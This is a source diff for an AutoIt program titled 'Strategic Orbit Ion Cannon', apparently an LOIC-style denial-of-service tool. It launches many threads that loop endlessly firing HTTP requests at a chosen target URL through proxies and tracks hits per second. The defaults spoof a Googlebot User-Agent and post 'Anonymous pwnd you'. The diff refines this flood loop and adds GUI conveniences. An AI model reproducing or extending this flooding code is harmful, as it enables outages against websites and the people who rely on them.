@@ -12,11 +12,20 @@
 #region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
 #endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
 ;
+#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
+#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
+;
+#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
+#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
+;
+#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
+#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
+;
 $oMyError = ObjEvent("AutoIt.Error", "IgnoreErr") ; Ignore errors and resume script
 ;$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc") ; Initialize a COM error handler
 If $CmdLine[0] = 3 Then
 	Opt("TrayIconHide", 1)
-	Local $athread[16], $2xx, $3xx, $4xx, $5xx, $Dropped, $TotKB, $oHTTP, $response0 = ""
+	Local $athread[16], $2xx, $3xx, $4xx, $5xx, $Failed, $TotKB, $oHTTP, $response0 = ""
 	For $column = 0 To 15
 		$athread[$column] = RegRead("HKCU\Software\soic", $CmdLine[1] & $column)
 		If @error Then Exit
@@ -24,12 +33,14 @@ If $CmdLine[0] = 3 Then
 	; split headers to name/value pairs and place to array
 	$aNameValue = StringSplit($athread[3], @CRLF, 1)
 	$T0 = TimerInit()
+	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
+	With $oHTTP
+		.SetProxy($athread[15], $athread[5], "") ; Use proxy_server for all domains. BypassList = ""
+		.SetTimeouts($athread[10], $athread[11], $athread[12], $athread[13])
+		;.SetClientCertificate("LOCAL_MACHINE\Personal\My Certificate")
+	EndWith
 	While 1
-		$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
 		With $oHTTP
-			.SetProxy($athread[15], $athread[5], "") ; Use proxy_server for all domains. BypassList = ""
-			.SetTimeouts($athread[10], $athread[11], $athread[12], $athread[13])
-			;.SetClientCertificate("LOCAL_MACHINE\Personal\My Certificate")
 			.Open($athread[1], $athread[0], True)
 			;.SetAutoLogonPolicy(2) ; Always = 0, default OnlyIfBypassProxy = 1, Never = 2
 			.SetCredentials($athread[6], $athread[7], 1) ; set credentials for proxy
@@ -38,24 +49,19 @@ If $CmdLine[0] = 3 Then
 				If $aNameValue[$header] = "" Or $aNameValue[$header + 1] = "" Then ExitLoop
 				.SetRequestHeader($aNameValue[$header], $aNameValue[$header + 1])
 			Next
-		EndWith
-		While 1
-			With $oHTTP
-				.Send($athread[2])
-				;.Abort
-				.WaitForResponse($athread[14])
-				;_ArrayDisplay($aListView)
-				;$timeinit = TimerInit()
-				;MsgBox(0, "Time Difference", $Pid)
-				$response1 = .Responsetext
-				$TotKB += BinaryLen(StringToBinary($response1)) / 1024
-				If $CmdLine[3] = 1 And $response1 <> "" And $response0 <> $response1 Then
-					RegWrite("HKCU\Software\soic", "Response", "REG_MULTI_SZ", .StatusText & @CRLF & $response1)
-					$response0 = $response1
-					Sleep(3000)
-				EndIf
-			EndWith
-			Switch $oHTTP.Status
+			.Send($athread[2])
+			;.Abort
+			.WaitForResponse($athread[14])
+			;_ArrayDisplay($aListView)
+			;$timeinit = TimerInit()
+			;MsgBox(0, "Time Difference", $Pid)
+			$response1 = .Responsetext
+			$TotKB += BinaryLen(StringToBinary($response1)) / 1024
+			If $CmdLine[3] = 1 And $response1 <> "" And TimerDiff($T0) > 1000 Then
+				RegWrite("HKCU\Software\soic", "Response", "REG_MULTI_SZ", .StatusText & @CRLF & $response1)
+				$response0 = $response1
+			EndIf
+			Switch .Status
 				Case 200 To 299
 					$2xx += 1
 				Case 300 To 399
@@ -65,18 +71,13 @@ If $CmdLine[0] = 3 Then
 				Case 500 To 599
 					$5xx += 1
 				Case Else
-					$Dropped += 1
-					If TimerDiff($T0) > 1000 Then
-						RegWrite("HKCU\Software\soic", $CmdLine[1] & "Status" & $CmdLine[2], "REG_MULTI_SZ", $2xx & "|" & $3xx & "|" & $4xx & "|" & $5xx & "|" & $Dropped & "|" & $TotKB)
-						$T0 = TimerInit()
-					EndIf
-					ExitLoop
+					$Failed += 1
 			EndSwitch
-			If TimerDiff($T0) > 1000 Then
-				RegWrite("HKCU\Software\soic", $CmdLine[1] & "Status" & $CmdLine[2], "REG_MULTI_SZ", $2xx & "|" & $3xx & "|" & $4xx & "|" & $5xx & "|" & $Dropped & "|" & $TotKB)
-				$T0 = TimerInit()
-			EndIf
-		WEnd
+		EndWith
+		If TimerDiff($T0) > 1000 Then
+			RegWrite("HKCU\Software\soic", $CmdLine[1] & "Status" & $CmdLine[2], "REG_MULTI_SZ", $2xx & "|" & $3xx & "|" & $4xx & "|" & $5xx & "|" & $Failed & "|" & $TotKB)
+			$T0 = TimerInit()
+		EndIf
 	WEnd
 Else
 	Opt("GUICloseOnESC", 0);turn off exit on esc.
@@ -105,7 +106,7 @@ Else
 	Global $bLVUPDATEONFOCUSCHANGE = True ;save editing if another cell is clicked
 	Global $bLVDBLCLICK = False;
 	Global $bLVITEMCHECKED = True; Listview has checkboxes
-	Global $bLVEDITONDBLCLICK = False ;Must dblclick to edit
+	Global $bLVEDITONDBLCLICK = True ;Must dblclick to edit
 	Global $bDATECHANGED = False;
 	Global $bPROGRESSSHOWING = False;
 	Global $bInitiated = False ; signal that edit controls initiated
@@ -184,7 +185,7 @@ Else
 	; ===============================================================================================================================
 	Global Const $tagLVITEM = "uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & _
 			"int Indent;int GroupID;uint Columns;ptr pColumns"
-	$Gui = GUICreate("Strategic Orbit Ion Cannon 1.0.0.4 Beta", 970, 460, 200, 125)
+	$Gui = GUICreate("Strategic Orbit Ion Cannon 1.0.0.5 Beta", 970, 460, 200, 125)
 	GUISetOnEvent(-3, "GuiClose") ; $GUI_EVENT_CLOSE = -3
 	$__LISTVIEWCTRL = GUICtrlCreateListView("TargetUrlIp|Method|PostData|HttpHeaders|Threads|ProxyIp:port|ProxyUserName|ProxyPassword|ServerUserName|" & _
 			"ServerPassword|ResolveTimeout, ms|ConnectTimeout|SendTimeout|ReceiveTimeout|WaitForResponse, sec", 0, 64, 970, 150, 0x0008) ; $LVS_SHOWSELALWAYS = 0x0008
@@ -207,8 +208,6 @@ Else
 	Global $LVcolRControl[$nColumnCount] = [256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256] ; right click actions
 	_SetLvContext("ContextMenu") ;set context function
 	$Button1 = GUICtrlCreateCheckbox("IMMA CHARGIN MAH LAZER", 800, 20, 161, 33, 0x1000) ; $BS_PUSHLIKE = 0x1000
-	$StatusBar1 = _GUICtrlStatusBar_Create($Gui)
-	_GUICtrlStatusBar_SetParts($StatusBar1, -1) ; the right edge of the corresponding part extends to the border of the window
 	_InitEditLib("", "", "", "", "", "", $Gui)
 	GUICtrlSetStyle($lvInput1, 8192) ; $ES_NUMBER = 8192
 	$UpDown = GUICtrlCreateUpdown($lvInput1, BitOR(0x0020, 0x0080)) ; $UDS_ARROWKEYS = 0x0020 $UDS_NOTHOUSANDS = 0x0080
@@ -265,6 +264,9 @@ Else
 		If GUICtrlRead($Button1) = 1 Then ;  1 = $GUI_CHECKED
 			$CheckedCount = _LvGetCheckedCount($__LISTVIEWCTRL)
 			If $CheckedCount > 0 Then
+				$StatusBar1 = _GUICtrlStatusBar_Create($Gui, -1, "Engaging...")
+				RegDelete("HKCU\Software\soic")
+				Save()
 				Button1Click()
 			EndIf
 		EndIf
@@ -290,6 +292,8 @@ Func Button1Click()
 					Case 1
 						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = "GET" ; default method if none specified
 					Case 2
+						RegWrite("HKCU\Software\soic", $nCheckedItem & $column, "REG_MULTI_SZ", $lvEditText[$item][0])
+						ContinueLoop
 					Case 3 ; split headers to name/value pairs and place to array
 						$aNameValue = StringSplit($lvEditText[$nCheckedItem - 1][1], @CRLF, 1)
 						If $aNameValue[0] > UBound($aHeaders, 2) Then ReDim $aHeaders[$CheckedCount][$aNameValue[0]]
@@ -316,7 +320,7 @@ Func Button1Click()
 					Case 9
 						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default serverPass
 					Case 10
-						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 5000 ; default resolve timout
+						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 60000 ; default resolve timout
 					Case 11
 						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 60000 ; default connect timeout
 					Case 12
@@ -343,11 +347,10 @@ Func Button1Click()
 			For $i = 1 To UBound($Pid) - 1
 				ProcessClose($Pid[$i])
 			Next
-			RegDelete("HKCU\Software\soic")
 			ExitLoop
 		EndIf
 		If GUICtrlRead($CBresp) = 1 Then GUICtrlSetData($Edit, RegRead("HKCU\Software\soic", "Response"))
-		Local $2xx = 0, $3xx = 0, $4xx = 0, $5xx = 0, $Dropped = 0, $TotKB1 = 0
+		Local $2xx = 0, $3xx = 0, $4xx = 0, $5xx = 0, $Failed = 0, $TotKB1 = 0
 		For $item = 1 To $nCheckedItem
 			For $thread = 1 To $aListView[$item - 1][4]
 				$aStatus = StringSplit(RegRead("HKCU\Software\soic", $item & "Status" & $thread), "|")
@@ -356,26 +359,30 @@ Func Button1Click()
 				$3xx += $aStatus[2]
 				$4xx += $aStatus[3]
 				$5xx += $aStatus[4]
-				$Dropped += $aStatus[5]
+				$Failed += $aStatus[5]
 				$TotKB1 += $aStatus[6]
 			Next
 		Next
 		$Hits1 = $2xx + $3xx + $4xx + $5xx
-		$statMsg1 = StringFormat("2xx: %u 3xx: %u 4xx: %u 5xx: %u Dropped: %u Received,KB: %u KB/sec: %.1f Hit/sec: %.1f", $2xx & @TAB, $3xx & @TAB, $4xx & @TAB, $5xx & @TAB, $Dropped & @TAB, $TotKB1 & @TAB, $TotKB1 - $TotKB0 & @TAB, $Hits1 - $Hits0)
-		_GUICtrlStatusBar_SetText($StatusBar1, $statMsg1, 0)
+		$statMsg1 = StringFormat("2xx: %u  3xx: %u  4xx: %u  5xx: %u  Fail: %u  Received, KB: %u  KB/s: %.1f  Hit/s: %.1f", $2xx, $3xx, $4xx, $5xx, $Failed, $TotKB1, $TotKB1 - $TotKB0, $Hits1 - $Hits0)
+		_GUICtrlStatusBar_SetText($StatusBar1, $statMsg1)
 		$TotKB0 = $TotKB1
 		$Hits0 = $Hits1
 	WEnd
 EndFunc   ;==>Button1Click
 
 Func GuiClose()
+	Save()
 	If GUICtrlRead($CBreg) = 1 Then RegDelete("HKCU\Software\soic")
 	For $i = 1 To UBound($Pid) - 1
 		ProcessClose($Pid[$i])
 	Next
+	_TermEditLib()
+	Exit
+EndFunc   ;==>GuiClose
+
+Func Save()
 	$nItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
-	If $nItemCount = 0 Then Exit
-	Local $aListView[$nItemCount][$nColumnCount]
 	;Save settings to ini file
 	$hFile = FileOpen(@ScriptName & ".ini", 2) ; $FO_OVERWRITE = 2
 	For $column = -1 To $nColumnCount - 1
@@ -388,29 +395,32 @@ Func GuiClose()
 					If $item = $nItemCount - 1 Then ExitLoop
 					FileWrite($hFile, "[$*-PostHeaderSplit-*$]" & @CRLF)
 				Case Else
-					$aListView[$item][$column] = _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $item, $column)
-					FileWrite($hFile, $aListView[$item][$column] & @CRLF)
+					FileWrite($hFile, _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $item, $column) & @CRLF)
 			EndSwitch
 		Next
 		If $column = $nColumnCount - 1 Then ExitLoop
 		FileWrite($hFile, "[$*-ColumnSplit-*$]" & @CRLF)
 	Next
 	FileClose(@ScriptName & ".ini")
-	_TermEditLib()
-	Exit
-EndFunc   ;==>GuiClose
+EndFunc   ;==>Save
 
 Func ContextMenu($aLVInfo)
 	;create context menu on demand.
 	;----------------------------------------------------------------------------------------------
 	If $DebugIt Then ConsoleWrite(_DebugHeader(StringFormat("MyContext Row:%d Col:%d", $aLVInfo[0], $aLVInfo[1])))
 	;----------------------------------------------------------------------------------------------
-	Local $HelpCtx[5]
+	Local $HelpCtx[11]
 	$HelpCtx[0] = GUICtrlCreateDummy()
 	$HelpCtx[1] = GUICtrlCreateContextMenu($HelpCtx[0])
 	$HelpCtx[2] = GUICtrlCreateMenuItem("Add Item", $HelpCtx[1])
 	$HelpCtx[3] = GUICtrlCreateMenuItem("", $HelpCtx[1])
 	$HelpCtx[4] = GUICtrlCreateMenuItem("Delete Item", $HelpCtx[1])
+	$HelpCtx[5] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+	$HelpCtx[6] = GUICtrlCreateMenuItem("Check Item", $HelpCtx[1])
+	$HelpCtx[7] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+	$HelpCtx[8] = GUICtrlCreateMenuItem("Uncheck Item", $HelpCtx[1])
+	$HelpCtx[9] = GUICtrlCreateMenuItem("", $HelpCtx[1])
+	$HelpCtx[10] = GUICtrlCreateMenuItem("Copy Item", $HelpCtx[1])
 	GUISetState(@SW_SHOW)
 	Local $ctx = _GUICtrlMenu_TrackPopupMenu(GUICtrlGetHandle($HelpCtx[1]), WinGetHandle($Gui), -1, -1, 2, 2, 2)
 	;----------------------------------------------------------------------------------------------
@@ -419,24 +429,42 @@ Func ContextMenu($aLVInfo)
 	Switch $ctx
 		Case $HelpCtx[2]
 			GUICtrlCreateListViewItem("http://|GET|Anonymous pwnd you|User-Agent" & @CRLF & "Googlebot/2.1 (+http://www.google.com/bot.html)" _
-					 & @CRLF & "Accept-Encoding" & @CRLF & "gzip" & @CRLF & "Connection" & @CRLF & "keep-alive" & @CRLF & "Content-type" & @CRLF & "text/html|10||||||5000|60000|30000|30000|0", $__LISTVIEWCTRL)
+					 & @CRLF & "Accept-Encoding" & @CRLF & "gzip" & @CRLF & "Connection" & @CRLF & "keep-alive" & @CRLF & "Content-type" & @CRLF & "text/html|10||||||60000|60000|30000|30000|0", $__LISTVIEWCTRL)
 			Local $ItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
+			If $ItemCount = 1 Then Global $lvEditText[1][2]
 			ReDim $lvEditText[$ItemCount][2]
 			$lvEditText[$ItemCount - 1][0] = "Anonymous pwnd you"
 			$lvEditText[$ItemCount - 1][1] = "User-Agent" & @CRLF & "Googlebot/2.1 (+http://www.google.com/bot.html)" & @CRLF & "Accept-Encoding" & @CRLF & "gzip" _
 					 & @CRLF & "Connection" & @CRLF & "keep-alive" & @CRLF & "Content-type" & @CRLF & "text/html"
 		Case $HelpCtx[4]
-			Local $ItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
-			If (_GUICtrlListView_GetSelectedCount($__LISTVIEWCTRL) == $ItemCount) Then
-				_GUICtrlListView_DeleteAllItems($__LISTVIEWCTRL)
-			Else
-				Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
-				_GUICtrlListView_SetItemSelected($__LISTVIEWCTRL, -1, False)
-				For $i = $items[0] To 1 Step -1
-					_GUICtrlListView_DeleteItem($__LISTVIEWCTRL, $items[$i])
-					_ArrayDelete($lvEditText, $items[$i])
+			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
+			For $i = $items[0] To 1 Step -1
+				_GUICtrlListView_DeleteItem($__LISTVIEWCTRL, $items[$i])
+				_ArrayDelete($lvEditText, $items[$i])
+			Next
+		Case $HelpCtx[6]
+			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
+			For $i = $items[0] To 1 Step -1
+				_GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $items[$i], True)
+			Next
+		Case $HelpCtx[8]
+			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
+			For $i = $items[0] To 1 Step -1
+				_GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $items[$i], False)
+			Next
+		Case $HelpCtx[10]
+			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
+			For $i = $items[0] To 1 Step -1
+				GUICtrlCreateListViewItem("", $__LISTVIEWCTRL)
+				Local $ItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
+				_GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $ItemCount - 1, _GUICtrlListView_GetItemChecked($__LISTVIEWCTRL, $items[$i]))
+				ReDim $lvEditText[$ItemCount][2]
+				$lvEditText[$ItemCount - 1][0] = $lvEditText[$items[$i]][0]
+				$lvEditText[$ItemCount - 1][1] = $lvEditText[$items[$i]][1]
+				For $column = 0 To $nColumnCount - 1
+					_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $ItemCount - 1, _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $items[$i], $column), $column)
 				Next
-			EndIf
+			Next
 	EndSwitch
 EndFunc   ;==>ContextMenu
 
@@ -549,7 +577,7 @@ Func _ListView_Click()
 					Return
 				EndIf
 			EndIf
-			_LVUpdate($editCtrl, $__LISTVIEWCTRL, $LVINFO[6], $LVINFO[7])
+			_LVUpdate($editCtrl, $__LISTVIEWCTRL, $LVINFO[0], $LVINFO[1])
 		Else
 			_CancelEdit()
 		EndIf
@@ -563,6 +591,7 @@ EndFunc   ;==>_ListView_Click
 ;===============================================================================
 ; Function Name:	ListView_RClick
 ; Description:	Called from WN_NOTIFY event handler.
+
 ; Parameter(s):
 ; Requirement(s):
 ; Return Value(s):
@@ -572,7 +601,7 @@ EndFunc   ;==>_ListView_Click
 ;===============================================================================
 Func _ListView_RClick()
 	If $editFlag = 1 Then
-		Return 0
+		_CancelEdit()
 	Else
 		;If $LVINFO[0] < 0 Or $LVINFO[1] < 0 Then Return 0
 		If $LVcolRControl[$LVINFO[1]] = 256 Then Call($LVCONTEXT, $LVINFO) ;call context call back function.
@@ -597,6 +626,7 @@ Func _ListView_DoubleClick()
 	If $DebugIt Then ConsoleWrite(_DebugHeader("$NM_DBLCLICK"))
 	;----------------------------------------------------------------------------------------------
 	If $editFlag = 0 Then
+		$bCanceled = False
 		_InitEdit($LVINFO, $LVcolControl)
 	Else
 		_CancelEdit()
@@ -992,7 +1022,7 @@ Func WM_Notify_Events($hWndGUI, $MsgID, $wParam, $lParam)
 							_ListView_Click()
 						EndIf
 					Else
-						If $editFlag = 1 Then _CancelEdit()
+						If $editFlag = 1 Then _ListView_Click()
 					EndIf
 
 					$bLVITEMCHECKED = False;
